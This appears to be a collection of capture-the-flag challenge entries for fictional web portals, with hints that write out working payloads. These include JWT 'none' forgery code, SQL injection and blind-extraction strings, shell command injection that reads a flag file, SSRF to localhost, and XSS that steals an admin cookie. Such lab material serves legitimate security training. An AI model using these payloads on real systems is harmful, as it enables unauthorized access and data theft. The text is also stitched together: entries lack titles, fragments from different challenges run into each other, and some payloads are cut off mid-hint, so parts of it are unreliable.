title: HavenView Residences — JWT None Algorithm Bypass
description: HavenView Residences is a tenant management portal for an apartment complex. The portal uses JSON Web Tokens (JWTs) for authentication. After signing in, tenants can view maintenance requests, lease documents, and payment history. An admin panel exists but is restricted to property managers. However, a critical flaw in the JWT verification logic may let you forge a token and escalate your privileges.
objectives: Sign in to the portal with one of the provided demo tenant accounts.
Locate your JWT session token and understand its structure (header, payload, signature).
Identify the vulnerability in how the server validates JWT algorithms.
Forge a modified JWT to gain admin access and retrieve the flag from the Admin Panel.
hints: After logging in, visit the 'My Profile' page. Your full JWT token is displayed along with the decoded header and payload.
The JWT header contains an 'alg' field set to 'HS256'. Some JWT implementations accept 'none' as a valid algorithm, which skips signature verification entirely.

To exploit this: Base64URL-decode the header, change 'alg' to 'none'. Base64URL-decode the payload, change 'role' to 'admin'. Re-encode both parts and construct a new token as 'header.payload.' (with an empty signature).

In the browser console: `const h = btoa(JSON.stringify({alg:'none',typ:'JWT'})).replace(/=/g,''); const p = btoa(JSON.stringify({id:1,username:'p.holloway',name:'Patricia Holloway',role:'admin',iat:Math.floor(Date.now()/1000),exp:Math.floor(Date.now()/1000)+86400})).replace(/\+/g,'-').replace(/\//g,'_').replace(/=/g,''); document.cookie='hv_token='+h+'.'+p+'.'; location.href='/admin';`

title: HarborView — JWT Forgery & Tenant Data Breach
description: HarborView Apartments runs a tenant management portal for residents to submit maintenance requests, view payments, and manage their lease. Property managers have access to a separate dashboard with full tenant records. The portal uses JWT-based authentication to distinguish between tenant, manager, and admin roles. Something about the way sessions are signed feels a little too simple, and the management API might not be as locked down as it seems. Chain the vulnerabilities together to access data you were never meant to see.
objectives: Sign in as a demo tenant and explore the portal to understand the authentication system.
Examine your JWT token on the Session Info page and determine how roles are assigned.
Find a way to elevate your role and gain access to the Tenant Manager dashboard.
Use the management API to discover and access a hidden tenant record containing the flag.
hints: Visit the Session Info page — it shows your full JWT token and decoded payload, including the signing algorithm (HS256) and your role claim.
HS256 JWTs are signed with an HMAC secret. If the secret is a common word, tools like hashcat or jwt_tool can crack it. Try common passwords.
Once you know the secret, forge a new JWT with the 'manager' role and replace your hv_token cookie. The Tenant Manager page will unlock.
The manager dashboard only shows active tenants (IDs 4, 5, 6), but the API endpoint /api/tenants/:id accepts any numeric ID. Try lower IDs like 1, 2, or 3 to find archived or hidden records.
The flag is in the privateNotes field of an archived tenant record that isn't listed anywhere in the UI. Enumerate IDs starting from 1.

title: HavenView — Apartment Portal Exploit Chain
description: HavenView is a tenant portal for an upscale apartment complex, offering maintenance requests, lease management, and rent payments. The property manager has access to an administrative tenant search panel that regular tenants cannot reach. Two vulnerabilities lurk beneath the polished surface — chain them together to breach the admin panel and extract classified building data.
objectives: Log in as a tenant and explore the portal's features.
Discover and exploit a stored XSS vulnerability to steal the admin's session cookie.
Use the stolen admin session to access the restricted Tenant Search panel.
Exploit a SQL injection vulnerability in the search feature to extract the flag from a hidden database table.
hints: Maintenance request descriptions are rendered without sanitization. Try submitting HTML/JS in the description field.
There's a webhook collector at /webhook/collect?data=... and a viewer at /webhook. Use these to exfiltrate data from XSS payloads.
After submitting an XSS payload that references document.cookie and the webhook endpoint, trigger the admin bot at /bot/visit to simulate the admin viewing your request.
Once you have the admin's ap_session cookie, set it in your browser (document.cookie='ap_session=STOLEN_VALUE') to access /admin/tenants.
The tenant search concatenates your input directly into a SQL query. Try injecting a UNION SELECT to read from other tables.
The flag is stored in a table called master_keys. The tenants table has 8 columns, so your UNION SELECT needs 8 values: ' UNION SELECT 1,2,secret,4,5,6,7,8 FROM master_keys--

title: HavenView — Command Injection in Network Tools
description: HavenView is an apartment management portal used by tenants, property managers, and maintenance staff. The portal includes a network diagnostics page for troubleshooting building connectivity. However, the utility tools may not properly sanitize user input before passing it to system commands. Can you exploit a weakness to read sensitive files on the server?
objectives: Log in to the portal using the provided demo credentials and explore all available features.
Navigate to the Network Tools page and understand how the diagnostics utilities work.
Identify how user input is being processed by the server-side command execution.
Inject a command separator and an additional command to read the flag file.
hints: The Network Tools page has ping, DNS lookup, and traceroute utilities — all of them accept user-controlled input that is embedded into a command string.
Try entering something unexpected in the hostname field. What happens if you include a semicolon (;) in your input?
The server constructs commands like `ping -c 4 <your-input>`. If your input is `192.168.1.1; cat .flag`, the server runs two commands: the ping and then cat.
Enter `; cat .flag` (or `127.0.0.1; cat .flag`) in any of the tool input fields to read the flag from the server's working directory.

title: Havenview Apartments — Tenant Data Exposure
description: Havenview Apartments runs a modern tenant portal where residents can view their lease documents, submit maintenance requests, and track rent payments. The web interface is careful to only display each tenant's own data — but does the backend API enforce the same boundaries? Another tenant's confidential document contains sensitive information that should never be visible to you.
objectives: Log in to the tenant portal using the provided demo credentials and explore all available features.
Discover how the frontend retrieves data by inspecting the page source or monitoring network requests.
Identify the API URL pattern used to fetch tenant-specific resources.
Access another tenant's confidential documents through the API to retrieve the flag.
hints: Visit the Documents page and look at the page source (Ctrl+U or View Source). The inline JavaScript reveals how documents are loaded.
The frontend uses fetch('/api/tenants/<id>/documents') to load your documents. What happens if you change the tenant ID in that URL?
There are at least 4 tenants in the system (IDs 1 through 4). Try requesting documents for each tenant ID.
Tenant ID 3 has a confidential settlement document. Fetch /api/tenants/3/documents in the browser console or address bar and read the document contents carefully.

title: SkyLine Residences — Lease Document Exposure

Navigate to the Lease Documents page and observe the Tenant ID form field.
Discover what happens when you change the Tenant ID to a different number.
Find and access the property manager's confidential lease record to retrieve the flag.
hints: Go to the Lease Documents page — notice the form has an editable 'Tenant ID' input field pre-filled with your own ID.
Your profile page shows your Tenant ID number. What IDs might other users have? Try lower numbers like 1.
Change the Tenant ID in the form to 1 and click 'View Lease' — the server doesn't verify whether you're authorized to see that record.
The property manager's lease (Tenant ID 1) contains a 'Private Notes' section with the flag.

title: HavenView — SQL Injection Login Bypass
description: HavenView is an apartment management portal where tenants can view maintenance requests, lease details, and rent payments. The property manager's dashboard contains sensitive administrative data. The login system has a critical flaw — can you bypass authentication and access the admin dashboard without knowing the manager's password?
objectives: Log in with one of the provided demo tenant accounts and explore the portal.
Examine how the login form works and think about what happens to your input on the server.
Craft a special username or password input that manipulates the login query to bypass authentication.
Access the Property Manager's dashboard and retrieve the flag.
hints: The login form sends your username and password to the server, which uses them directly in a SQL query. What if your input contained SQL syntax?
SQL injection works by breaking out of a string in a query. A single quote (') can end the string value and let you inject your own SQL logic.
Try entering ' OR 1=1 -- as the username (with any password). The -- comments out the rest of the query, and OR 1=1 makes the condition always true.
When the injection returns all users, the server logs you in as the first user in the database — which is the Property Manager (admin). The flag is displayed on the admin dashboard.

title: HavenView — Second-Order SQL Injection
description: HavenView is an apartment management portal where tenants can submit maintenance requests, view lease documents, and track rent payments. The developers were careful to use parameterized queries for registration and login — but they got sloppy elsewhere. A malicious username stored today could wreak havoc when it's used in a query tomorrow. Can you exploit this second-order SQL injection to access the property manager's confidential records?
objectives: Register a new tenant account and explore the portal's features.
Observe how your username is used across different pages — especially in database queries.
Craft a username that is stored safely but causes SQL injection when later interpolated into a query.
Access the property manager's confidential maintenance records containing the flag.
hints: Registration and login use parameterized queries, so direct SQL injection on those forms won't work. But what about after login?
After you log in, the dashboard loads your maintenance requests using your stored username. What if that username contained SQL syntax?
Try registering with the username: admin'-- (including the quote and dashes). The registration will succeed because it uses a parameterized INSERT.

Once logged in as admin'--, the maintenance query becomes: SELECT * FROM maintenance_requests WHERE tenant_username = 'admin'--' — the -- comments out the trailing quote, and you see admin's records instead of yours.

title: HavenView — Stored XSS in Maintenance Comments
description: HavenView Apartments is a tenant management portal where residents submit maintenance requests and communicate with property management through comments. The property manager's browser automatically reviews every new comment. Can you exploit an input sanitization oversight to steal her credentials and access confidential documents?
objectives: Log in with the demo tenant credentials and explore the maintenance request system.
Discover that comment text is rendered without sanitization by testing with HTML like test.
Craft a stored XSS payload using an tag with an onerror handler to steal the admin bot's cookies.
Use the captured admin_token cookie to access the restricted /api/admin/private-docs endpoint and retrieve the flag.
hints: Go to any maintenance request and try posting a comment with HTML tags like bold or italic. Notice the HTML renders — the comments are not sanitized.
The property manager's browser automatically visits pages with new comments. Her session includes an admin_token cookie. Try stealing it with:
After posting the XSS payload, wait a few seconds and check the Network Monitor page (or /api/captures) to see the captured admin_token cookie value.
Set the stolen cookie in your browser console: document.cookie = 'admin_token=CAPTURED_VALUE'; then fetch('/api/admin/private-docs').then(r=>r.json()).then(console.log) to get the flag.

title: NexusBank — SSRF to Blind SQLi Extraction
description: NexusBank is an online banking portal with accounts, transfers, and a compliance link verification tool. The portal exposes internal service endpoints that are blocked from direct browser access — but the server-side link verifier might not enforce the same boundaries. Behind the internal API lies a database with secrets that are never displayed directly. Can you chain two vulnerabilities to extract the flag character by character?
objectives: Log in to the banking portal and explore all available features and documentation.
Discover the internal API endpoints and find a way to access them despite browser restrictions.
Identify the injection point on the internal search endpoint and determine the true/false oracle.
Extract the flag from the database one character at a time using blind boolean-based SQL injection through the SSRF proxy.
hints: The Link Verifier makes server-side HTTP requests on your behalf. The API docs list internal endpoints that are blocked from direct access — but what if you ask the verifier to fetch them?
Try using the Link Verifier to fetch http://localhost:3000/internal/api/health — this will reveal the internal service details and confirm SSRF access.

The /internal/api/accounts/search?q= endpoint takes an account number. Try a valid one like NXB-80041001 and observe the 'found' vs 'not_found' response. Now think about what happens if you inject SQL into the q parameter.

Use blind boolean SQLi through the SSRF: the flag is in a table called 'flags' with a column 'secret'. Inject: NXB-80041001' AND SUBSTR((SELECT secret FROM flags LIMIT 1),1,1)='T' --  and check if the response says 'found' (true) or 'not_found' (false). Extract each character by incrementing the position. The flag starts with TARANTU{.

title: NexusBank — Command Injection Filter Bypass
description: NexusBank is an online banking portal with account management, transfers, and statement exports. The statement export tool passes user input to a system command, but the developers have implemented input filtering to block dangerous characters like semicolons, pipes, and ampersands. However, the filter has a critical blind spot. Can you find a way to bypass the sanitization and extract sensitive data from the server?
objectives: Log in to the NexusBank portal and explore the available features.
Find the Statement Export Tool on the Statements page and understand how it processes input.
Identify which characters are blocked and which bypass techniques still work.
Use command substitution to read the .flag file and retrieve the secret flag.
hints: The Statement Export Tool on the Statements page takes a reference and passes it to a system command. Look at the terminal output — it shows the full command being executed.
The filter blocks semicolons (;), pipes (|), and ampersands (&). But there are other ways to chain or inject commands in bash.
Command substitution with $() or backticks (``) is NOT blocked by the filter. The shell resolves $(...) before executing the outer command.
Try entering $(cat .flag) as the statement reference. The shell will execute 'cat .flag' first, substitute the flag value into the find command, and the flag will appear in the output.

title: NexusBank — Broken Access Control
description: NexusBank is an online banking portal with accounts, transactions, transfers, beneficiaries, and document management. The web interface carefully restricts each customer to their own data — but does the underlying API enforce the same rules? A high-value private banking client may have sensitive documents you're not supposed to see.
objectives: Log in with one of the demo accounts and explore the banking portal.
Discover how the Documents page loads data by inspecting the page source or network traffic.
Identify the API endpoint pattern and test whether it enforces user-level authorization.
Access another user's confidential documents to retrieve the flag.
hints: Open the Documents page and look at the page source (View Source or DevTools). Notice the JavaScript that fetches document data from an API endpoint.
The frontend JavaScript calls fetch('/api/users/' + userId + '/documents'). Your userId is embedded in the page — what happens if you change it?
There are 3 users in the system. Your demo account is user 2 or 3. Try fetching /api/users/1/documents in the browser console or address bar.
User 1 is a Private Banking client named Victoria Harrington. Her document DOC-0002 contains a Wire Transfer Authorization with a verification code — that's the flag.

title: NexusBank — Predictable Token IDOR
description: NexusBank is an online banking portal where customers can view statements, manage transfers, and track beneficiaries. Each account's statements are accessed via a unique token that appears secure at first glance. However, the token generation scheme hides a predictable pattern. Can you decode it, forge another customer's token, and access their confidential financial records?
objectives: Sign in with a demo account and explore the banking portal.
Locate your statement access token — it appears in URLs, your dashboard, and your profile page.
Decode the token to discover how it is generated and identify the predictable pattern.
Forge a token for another user's account and access their private statements to find the flag.
hints: When you visit the Statements page, look at the URL — it includes a `token` query parameter. Your profile page also displays this token.
The token looks like a random string, but try Base64-decoding it. You can use `atob('your_token')` in the browser console.
After decoding, you'll see the format is `acct_N` where N is a user ID. Your account is one of these IDs — what would other IDs look like?

Generate a token for the Platinum account holder (user ID 1): `btoa('acct_1')` gives you `YWNjdF8x`. Visit `/statements?token=YWNjdF8x` to view their confidential statements — the flag is in a transaction memo.

title: NexusBank — SQL Injection in Transaction Search
description: NexusBank is an online banking portal where customers can view transactions, transfer funds, and manage beneficiaries. The statement search feature lets you filter transactions by description — but the query behind it may not be as secure as it looks. Can you manipulate the search to reveal records you were never meant to see?
objectives: Log in to the banking portal using one of the demo accounts.
Navigate to the Statements page and explore the transaction search feature.
Craft a search query that breaks out of the intended SQL filter to return all records from the database.
Find the hidden flag embedded in a system transaction that normal users cannot access.
hints: The search feature filters transactions using a SQL LIKE clause. Try entering a single quote (') to see if the query breaks.
The backend query looks like: WHERE user_id = X AND description LIKE '%YOUR_INPUT%'. Your goal is to escape the LIKE clause.
The payload %' OR 1=1 -- will close the LIKE pattern, add an always-true condition, and comment out the rest of the query.
After injecting the payload, look through ALL the results carefully — the flag is hidden in a system-level transaction description that doesn't belong to your account.

title: SilverCrest Banking — Reflected XSS
description: SilverCrest is an online banking portal with accounts, transfers, statements, and beneficiaries. Notice that your search input is reflected directly in the page without being sanitized.
Inject a script payload through the search field to discover and extract the hidden compliance token (the flag).

in the search field.

Find the Feedback Board where customers can post messages visible to other users.

Craft a stored XSS payload using an tag with an onerror handler that exfiltrates the admin's cookie to /api/steal.

Use an tag with an invalid source to trigger an onerror handler:
Your onerror handler should exfiltrate the admin's cookies:

title: NexusCorp — Employee Portal Exploit Chain
description: NexusCorp's internal employee portal lets staff browse the company directory, post shoutouts to recognize colleagues, and (for HR admins) access confidential employee records. Something about the shoutouts feature seems a little too trusting, and the HR records API might reveal more than it should. Can you chain two vulnerabilities together to access data you were never meant to see?
objectives: Create an account and explore the portal features — dashboard, directory, shoutouts, and webhook log.
Find a way to steal the HR Director's session through the shoutouts board.
Use the stolen admin session to access the HR records API.
Discover a hidden employee record that contains the flag.

There's an admin bot at /bot/visit that simulates the HR Director reviewing shoutouts. The webhook collector at /webhook/collect?data=... captures anything you send to it. Use XSS to exfiltrate the bot's session cookie.

The HR Records page shows employees starting from ID 1, but the API at /api/admin/employees/:id doesn't restrict which IDs you can query. Try fetching /api/admin/employees/0 — there's a hidden service account the UI doesn't list.

description: HorizonCorp is a corporate employee portal with an internal directory, department listings, performance reviews, and HR documents. The login form has a critical vulnerability that allows authentication bypass. Can you exploit it to gain admin access and retrieve the confidential security token?

Gain access to the admin dashboard and the confidential section.
Retrieve the flag from the restricted HR area.
hints: The login form sends your username and password directly to a SQL query on the server. What happens if you include SQL syntax in the input fields?
Classic SQL injection payloads manipulate the WHERE clause of a SELECT statement. Try making the condition always evaluate to true.
Enter ' OR 1=1 -- as the username (with any password). The -- comments out the rest of the query, and OR 1=1 makes it always true.
The first user in the database is the admin. Once logged in as admin, check the Dashboard or the Confidential section in the sidebar for the flag.

title: NexusCorp — Numeric SQL Injection
description: NexusCorp is a corporate employee portal used for managing departments, staff directories, and quarterly performance reviews. The HR team recently deployed a new review filtering feature that lets employees browse reviews by department. However, the developer made a critical mistake with how the department filter is handled. Can you exploit it to access a classified executive board review that contains sensitive data?
objectives: Log in with one of the provided demo credentials and explore the portal.
Navigate to the Performance Reviews page and observe how the department filter works.
Notice that the department ID is passed as a URL parameter and reflected in the query display.
Exploit the numeric SQL injection vulnerability to retrieve all reviews, including the hidden classified record containing the flag.
hints: Look at the URL when filtering reviews — it uses a query parameter like ?dept=1. What happens if you change that number?
The department ID is injected directly into the SQL query as a number (no quotes). This means you can append SQL logic without needing to escape strings.
Try changing the URL parameter to something like: ?dept=1 OR 1=1 — this makes the WHERE clause always true, returning ALL rows.
There is a hidden review with a very high department_id (not listed in the normal departments). The OR 1=1 payload will return it along with everything else. Look for a row marked CLASSIFIED.

title: NexusHR — SQL Injection in Employee Search
description: NexusHR is a corporate employee management portal used by the HR department to search and manage personnel records. The employee directory has a handy search feature — but the developer built it a little too hastily. A restricted record containing sensitive data is hidden from normal view. objectives: Log in to the NexusHR portal using the provided demo credentials.
Navigate to the Employee Directory and test the search functionality.
Identify that the search field is vulnerable to SQL injection.
Craft an injection payload that bypasses the query's status filter to reveal a restricted record containing the flag.

The query filters results to only show employees with status = 'active'. A restricted record exists that you can't normally see.
The search input is placed inside a LIKE pattern: WHERE (name LIKE '%YOUR_INPUT%' ...) AND status = 'active'. You need to close the LIKE, inject a condition, and comment out the rest.

Try this payload in the search box: %' OR 1=1 --   This closes the LIKE pattern, adds an always-true condition, and comments out the status filter — revealing all records including the restricted one with the flag.

title: NeonKart — JWT Forgery & IDOR Chain
description: NeonKart is a premium e-commerce platform with a slick customer interface and a management dashboard for privileged staff. As a regular customer, you have no access to the order management system — but the authentication mechanism might have a weakness. Forge a token with elevated privileges to access restricted management features.

The manager dashboard shows customer IDs starting at 2, but the 'Registered Accounts' stat reveals there are more accounts. Try fetching /api/manager/customers/1/orders to find the hidden founder's order data.

title: NeonMart — SSRF to Blind SQLi Chain
description: NeonMart is an online electronics store with a seller tools suite. One of the tools — the Supplier Link Checker — fetches arbitrary URLs from the server side to validate supplier product pages. Deep inside the platform, an internal inventory search endpoint is supposed to be inaccessible from the outside, but it has a critical flaw in its database query. Chain these two weaknesses to extract a secret hidden in the database.
objectives: Create an account or log in with demo credentials and explore the platform's features.
Discover the internal inventory search endpoint and find a way to reach it from outside.
Identify the injection point in the internal search and confirm it behaves as a boolean oracle.
Extract the flag character-by-character from the database using blind boolean SQL injection via SSRF.
hints: The Supplier Link Checker at /tools/link-checker makes server-side HTTP requests. What happens if you point it at localhost:3000 instead of an external URL?
Check the API Docs page — there is an internal endpoint at /internal/inventory/search?q=... that is blocked from direct browser access but reachable through the link checker's server-side fetch.

The internal search endpoint returns 'found' or 'not_found' based on the SKU query. Try injecting SQL: use a non-existent SKU prefix followed by ' OR 1=1-- to confirm injection works. Then try ' OR 1=2-- to see the difference.

The flag is stored in a table called 'flags' in a column called 'secret'. Extract it character by character: use http://localhost:3000/internal/inventory/search?q=FAKE' OR SUBSTR((SELECT secret FROM flags LIMIT 1),1,1)='T'-- and vary the position and character. Automate this with a script in the browser console.

title: ShipNova — Command Injection Filter Bypass
description: ShipNova is an e-commerce operations portal with product management, order tracking, and a shipping label generator. The fulfillment tool connects to a backend CLI engine to format labels — but the input sanitization has blind spots. Semicolons, pipes, and ampersands are blocked, but can you find another way to inject commands and read the secret flag file?
objectives: Log in to the ShipNova portal and explore the available features.
Navigate to the Fulfillment page and use the Shipping Label Generator tool.
Discover which characters are blocked and which are allowed in the recipient input.
Bypass the input filter using command substitution to read the .flag file.
hints: The Shipping Label Generator passes your input into a system command. Try entering special characters to see what's blocked.
Semicolons (;), pipes (|), and ampersands (&) are filtered — but there are other ways to chain or inject commands in shell environments.
In bash, $(command) and `command` (backticks) perform command substitution — they execute the inner command and substitute its output inline.
Try entering $(cat .flag) as the recipient name. The filter doesn't block $, (, or ) characters, so the shell will execute cat .flag and embed the flag in the label output.

title: NeonCart — Order History Exposure

title: NeonMart — SQL Injection in Product Search
description: NeonMart is a sleek online electronics store with a product catalog, shopping cart, and order history. The product search feature looks harmless, but something about the way it builds its database query isn't quite right. Can you manipulate the search to reveal hidden inventory records?
objectives: Create an account or log in with the provided demo credentials.
Use the product search feature on the shop page to search for items.
Discover that the search input is vulnerable to SQL injection.
Craft a payload that bypasses the listing filter to reveal a hidden internal record containing the flag.
hints: Try searching for a single quote (') and observe what happens. An error suggests the input is being placed directly into a SQL query.
The search query likely uses LIKE with your input: WHERE listed = 1 AND name LIKE '%YOUR_INPUT%'. Think about how to break out of the LIKE clause.
The payload needs to close the existing LIKE pattern and add an OR condition that's always true. Try: %' OR 1=1 --
The full payload is: %' OR 1=1 --  (with a trailing space). This turns the query into: WHERE listed = 1 AND name LIKE '%%' OR 1=1 -- which returns ALL products, including unlisted internal records.

title: NeonKart — Reflected XSS in Product Search
description: NeonKart is a premium tech e-commerce store with products, a shopping cart, and order history. The product search feature has a critical flaw — user input is reflected directly into the page without sanitization. A secret reward token is embedded in every authenticated page, invisible to normal users. Can you exploit the search to reveal it?
objectives: Create an account or sign in with the demo credentials and explore the store.
Find the search functionality on the Products page and observe how your input is reflected in the results.
Craft a search query that injects a script tag into the page to execute arbitrary JavaScript.
Use the injected script to read and display the hidden reward token from the page's DOM or JavaScript context.
hints: Try searching for something like test on the Products page. Notice how the bold tag renders — the input is not being sanitized.

The page contains a hidden element with id '__loyalty_program' and a data attribute called 'data-reward-token'. There's also a JavaScript object window.__nk_store_config with a 'rewardToken' property.
Try this search query: <script>document.querySelector('.search-info').innerHTML=window.__nk_store_config.rewardToken</script>
Since alert() is blocked in sandboxed iframes, use document.write() or DOM manipulation to display the flag: <script>document.write(window.__nk_store_config.rewardToken)</script>

title: FitPulse — Forced Browsing to Hidden Admin Panel
description: FitPulse is a fitness tracker platform where athletes log workouts, track health metrics, and receive coaching feedback. The development team left an administrative panel deployed in production — it's not linked anywhere in the navigation, but a careful eye might find clues pointing to its existence. objectives: Log in to the FitPulse application using one of the provided demo accounts.
Explore the application and look for clues about hidden or unlisted pages.
Discover the path to the admin panel that was accidentally left accessible.
Navigate to the unprotected admin panel and retrieve the flag.
hints: Not all pages in a web application are linked in the navigation. Developers sometimes leave things in the HTML source code — try viewing the page source (Ctrl+U or right-click → View Page Source).
Look for HTML comments in the page source. Developers often leave TODO notes and reminders that reveal internal paths.
There's also a well-known file that search engine crawlers check — try requesting /robots.txt in your browser.
The admin panel is at /admin/panel and has no authentication check. Just navigate directly to it.

title: FitCore — Coupon Stack Attack
description: FitCore is a fitness intelligence platform where members can track workouts, monitor health metrics, and upgrade their subscription plan. The store offers promotional coupon codes that give percentage discounts at checkout. The UI enforces a one-coupon-per-order policy — but does the server agree? Exploit a business logic flaw to stack multiple discounts and drive your total to zero.
objectives: Log in and explore the FitCore platform — workouts, metrics, coach notes, and the store.
Visit the store and navigate to the checkout page for any plan. Observe how coupon codes are applied.
Intercept or replicate the checkout API request and discover that the server accepts an array of coupon codes instead of just one.
Stack enough valid coupon codes in a single checkout request to reduce the total price to $0 or below, triggering the free-order confirmation and revealing the flag.
hints: The UI only lets you enter one coupon code and locks further input after the first — this restriction exists entirely in client-side JavaScript. The server never enforces it.
Use the browser DevTools Network tab to inspect what happens when you click 'Complete Purchase'. Pay close attention to the JSON body format sent to /api/checkout — notice the coupons field.

Try sending a custom fetch request from the browser console: fetch('/api/checkout', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({planId:'basic', coupons:['WELCOME25','HEALTH20']})}).then(r=>r.json()).then(console.log)

Valid coupon codes are hinted throughout the UI. Try stacking: WELCOME25 (25%), HEALTH20 (20%), GAINS15 (15%), FIT10 (10%), SUMMER10 (10%), NEWUSER15 (15%), PROMO20 (20%). Combine enough to exceed 100% total discount.

title: FitPulse — JWT Forgery & Blind SQL Injection Chain
description: FitPulse is a fitness coaching platform with role-based access: athletes track workouts, coaches manage athlete databases, and admins configure the system. The platform uses JWT tokens for session management and a SQLite backend for data storage. No single weakness is critical — but chaining a JWT vulnerability with a database flaw in the coaching tools could expose the platform's deepest secret. Can you escalate from a regular athlete to extract the flag?
objectives: Create an account or log in as a demo athlete and explore the platform.
Investigate the JWT session token on the Session Info page and find a way to forge an elevated token.
Access the coach-only Athlete Search panel using your forged session.
Exploit the search functionality to extract the flag from the database character by character.
hints: Visit the /session page — it shows your raw JWT token and its decoded header/payload. Notice the signing algorithm is HS256 and the payload includes a 'role' field.

The JWT HMAC secret is a very common word. Try cracking it with tools like jwt_tool, hashcat, or John the Ripper using a common wordlist. Once you know the secret, you can forge a token with 'role': 'coach'.
Set your forged JWT as the fp_session cookie value. The coach dashboard at /coach/athletes has a search field that queries athletes by name directly against the database.

The search field is vulnerable to SQL injection. Use a blind boolean approach: try queries like: %' AND SUBSTR((SELECT secret FROM flags LIMIT 1),1,1)='T' --    The response changes between 'Found' and 'No athletes found' based on whether the condition is true.

Retrieve the flag from the coach's private vault.
hints: The API Reference page documents all endpoints, including an internal one at /internal/api/search that requires a special header. Try accessing it directly — you'll be blocked.
The Import Plan page has a URL fetcher that makes server-side requests. What happens if you point it at http://localhost:3000/internal/api/search?q=Strength?
The internal search endpoint concatenates the 'q' parameter directly into a SQL query. Try submitting a single quote to see if you get an error back through the fetcher.

The exercises table has 5 columns (id, name, category, muscle_group, difficulty). There's a table called coach_vault with columns id, entry_type, content. Use a UNION SELECT with matching columns through the SSRF: http://localhost:3000/internal/api/search?q=' UNION SELECT id,entry_type,content,'x','x' FROM coach_vault--

Exploit SQL injection in the athlete search to extract the flag from a hidden database table.
hints: Posts on the community board are rendered without sanitization. Try posting HTML like and see if it executes when the page loads.

Replace your ft_session cookie with the admin's stolen cookie to access /admin/athletes. The search feature builds SQL queries with your input — try a UNION SELECT to read from the system_vault table (columns: id, entry_key, entry_value).

title: FitPulse — SQL Injection Login Bypass
description: FitPulse is a fitness tracking platform used by athletes and their coach. The login system has a critical vulnerability — user input is concatenated directly into the SQL query without sanitization. Can you bypass authentication and access the coach's confidential dashboard?
objectives: Explore the login page and try the demo credentials to see a normal athlete dashboard.
Identify the SQL injection vulnerability in the login form.
Craft a payload that makes the WHERE clause always true, bypassing authentication.
Access the Head Coach's dashboard and retrieve the confidential flag.
hints: The login form sends your username and password directly into a SQL query. What happens if your input contains a single quote?
The server builds the query like: SELECT * FROM users WHERE username = '<input>' AND password = '<input>'. Can you break out of the string?
Try entering ' OR 1=1 -- as the username (with any password). The -- comments out the rest of the query, and OR 1=1 makes it always true.
The first user in the database is the Head Coach. When the injection returns all rows, you log in as the first result — the coach — whose dashboard contains the flag.

title: NexusCore — Negative Quantity Exploit
description: NexusCore is a gaming platform where players can buy in-game items, track stats, and climb the leaderboard. An exclusive Elite Armory is locked behind a massive credit balance requirement. The store seems secure — but does it really validate everything it should? Find a way to amass enough credits to unlock the Elite Armory and claim the secret reward.
objectives: Create an account or log in with the demo credentials and explore the platform.
Visit the Store and understand how purchasing works — items have prices and you provide a quantity.
Discover a flaw in the purchase logic that allows you to generate credits instead of spending them.
Accumulate enough credits to meet the Elite Armory threshold (◈ 50,000) and retrieve the flag.
hints: The store validates that quantity is a number and not zero, but does it check anything else about the quantity value?
Try purchasing an item with a negative quantity. What happens to the total cost when price × quantity results in a negative number?
When the total cost is negative, the balance check (balance >= total) always passes. Then balance -= negativeCost actually adds credits to your account.

Use the browser console or modify the quantity input: fetch('/store/buy', {method:'POST', headers:{'Content-Type':'application/json'}, body:JSON.stringify({itemId:7, quantity:-20})}).then(r=>r.json()).then(console.log) — then visit /elite-armory once you have ◈ 50,000+

title: NexusArena — SSRF to SQL Injection Chain

objectives: Log in and explore the platform features — dashboard, leaderboard, clips, and platform info.
Find a way to reach an internal API endpoint that is blocked from direct browser access.

hints: Check the Platform Info page carefully — it documents both public and internal services, including their access restrictions.

The internal player search endpoint concatenates your search input directly into a SQL query. Try a single quote (') to see if it breaks the query — the error message reveals the query structure.

The players table has 5 columns in the search query (id, username, display_name, tier, elo). Use UNION SELECT with matching columns to extract data from platform_secrets. Example: ' UNION SELECT id, secret_type, secret_value, 'x', 0 FROM platform_secrets --

description: NexusArena is an online gaming platform with player profiles, leaderboards, inventory, and server diagnostics tools. Once you confirm command injection works, read the flag file: 10.0.1.10; cat .flag

The 'Ancient Cipher Key' in ShadowBlade's inventory has the flag in its description.

title: NexusArena — SQL Injection Login Bypass
description: NexusArena is a competitive gaming platform with player profiles, leaderboards, and in-game inventories. The admin panel holds a secret tournament master key, but the admin credentials aren't publicly known. Can you find a way past the login form without knowing the password?

Retrieve the flag displayed on the admin dashboard.

The server builds a SQL query by directly inserting your input: SELECT * FROM users WHERE username = '<your_input>' AND password = '<password>'. You can manipulate this query structure.

title: Eldenvale Portal — Permit Workflow Bypass
description: The City of Eldenvale's online citizen portal handles permit applications through a strict four-stage approval workflow: Submit → Review → Approve → Issue. The UI enforces every step — but does the backend? As a registered citizen, your applications sit in SUBMITTED status, waiting weeks for staff action. Somewhere in this pipeline, a shortcut might exist. Find it, skip the queue, and obtain an officially-issued permit document — without ever getting reviewed or approved.
objectives: Log in as alice.chen (or any citizen account) and submit a new permit application.
Understand the four-step workflow: submit → review → approve → execute (issue).
Identify that the UI restricts the 'Issue Permit' action to directors on APPROVED applications only.
Discover that the backend /api/permits/:id/execute endpoint lacks server-side workflow state validation.
Call the execute endpoint directly on your SUBMITTED application to bypass the review and approval stages and retrieve the flag from the issued document.
hints: The UI only shows the 'Issue Permit' button to directors when an application is in APPROVED status — but the button is just HTML. What does the underlying API endpoint actually check?
Look at the form actions on the permit detail page. Each workflow step posts to /api/permits/:id/<action>. What validation does each endpoint perform?

Try sending a POST request directly to /api/permits/<your-permit-id>/execute while logged in as a citizen. You can use the browser console: fetch('/api/permits/PERMIT-2025-XXX/execute', {method:'POST'}).then(r=>r.json()).then(console.log)

The /api/permits/:id/review endpoint returns a 400 error if the application is not SUBMITTED. The /api/permits/:id/approve endpoint requires REVIEWED status. Check whether /api/permits/:id/execute has any equivalent status check at all.

title: CivicAccess — Government Services Exploit Chain
description: CivicAccess is an internal government services portal used by municipal employees to manage permits, tax records, and official documents. The portal includes a Document Verifier tool for validating external links. Beneath the surface, an internal microservice handles citizen record lookups — but it was never meant to be accessed from the outside. Chain two vulnerabilities to breach the classified audit database and extract the flag.
objectives: Log into the portal and explore all available features and announcements.
Discover the internal records API endpoint and find a way to reach it from the Document Verifier.
Identify the SQL injection vulnerability in the internal endpoint's query parameter.
Use blind boolean-based SQL injection through the SSRF proxy to extract the flag character by character from the audit_secrets table.
hints: The Announcements page contains useful information about internal services, including an API endpoint path and database table names.
